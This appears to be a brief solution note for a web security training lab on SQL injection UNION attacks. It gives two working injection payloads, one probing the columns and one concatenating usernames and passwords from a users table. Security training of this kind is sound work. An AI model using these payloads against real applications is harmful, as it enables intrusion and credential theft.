Title: SQL injection UNION attack, retrieving multiple values in a single column
Level: Practitioner
Desc:  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
The database contains a different table called users, with columns called username and password.
To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

category=Accessories' OR 1=1 UNION SELECT '1','2'-- 

category=Accessories' OR 1=1 UNION SELECT '1',concat(username,password) FROM users-- 
